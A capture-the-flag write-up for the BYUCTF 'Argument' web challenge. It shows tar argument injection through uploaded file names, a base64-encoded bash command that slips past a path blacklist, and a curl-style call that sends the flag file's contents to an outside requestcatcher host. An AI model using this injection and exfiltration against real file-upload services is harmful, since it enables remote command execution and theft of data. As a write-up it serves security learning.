<font size = '4'>
<p align = 'center'>
<b>
BYUCTF - Argument Writeup 
</b>
</p>
</font>

<br>
<font size = '3'>

<b>Challenge Description:</b><br>

I just wanted to make a simple application where people can store files. But I'm a good college student and have taken web security classes, so I'm aware of all the vulnerabilities that may exist and made my app perfectly secure! There's no way you'd be able to get the flag...

https://argument.chal.cyberjousting.com

[argument.zip]

<br>

<b>Exploitation:</b><br>

Basically, this challenge uses argument injection using the tar command, using the `--checkpoint` and `--checkpoint-action` arguments which can execute arbitrary commands when certain "checkpoints" are met.

Directory traversal is prevented by blacklisting `..` and `/`.  To bypass this, the command is converted to base64 to then be decoded. Looking at server.py, the filenames are directly used in the tar command, which is where the injection occurs.

The command used is `https://asdfsafasdfs.requestcatcher.com/$(cat /flag*)`, which will send the contents of any file matching /flag* to requestcatcher.

First, a random file is uploaded to create the first checkpoint.
```python
files = {"file": ("--checkpoint=1", "doesn't matter")}
resp = session.request("POST", f"{URL}/api/upload", files=files)
```

To bypass the blacklist, cmd used:
```python
files = {"file": (f"--checkpoint-action=exec=echo '{base64.b64encode(cmd).decode()}' | base64 -d | bash", "doesn't matter")}
resp = session.request("POST", f"{URL}/api/upload", files=files)
```